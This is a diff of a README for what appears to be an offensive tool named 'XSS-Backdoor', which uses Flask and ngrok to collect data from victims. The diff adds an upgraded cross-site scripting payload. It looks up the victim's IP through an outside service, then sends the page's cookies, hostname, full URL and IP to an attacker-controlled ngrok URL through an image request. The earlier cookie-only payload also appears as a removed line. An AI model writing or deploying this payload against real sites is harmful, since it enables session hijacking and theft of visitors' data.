@@ -21,7 +21,7 @@ pip install flask pyngrok colorama user-agents
 ## Setup and Usage
 1. Clone this repository:
    ```bash
-   git clone https://github.com/yourusername/trap-backdoor.git
+   git clone https://github.com/SenselessCore/XSS-Backdoor.git
    cd trap-backdoor
    ```
 2. Install dependencies:
@@ -35,7 +35,8 @@ pip install flask pyngrok colorama user-agents
 4. The script will generate an `ngrok` URL, which can be used to collect visitor information.
 5. Payload URL:
    ```html
-   <script>var i=new Image;i.src="NGROK_URL/?" + document.cookie + "&host=" + document.location.hostname;</script>
+   <script>fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"_").then(ip=>{new Image().src="NGROK_URL/?"+document.cookie+"&host="+location.hostname+"&url="+encodeURIComponent(location.href)+"&ip="+ip})</script>
+
    ```
    Replace `NGROK_URL` with the actual `ngrok` link printed in the console.
 
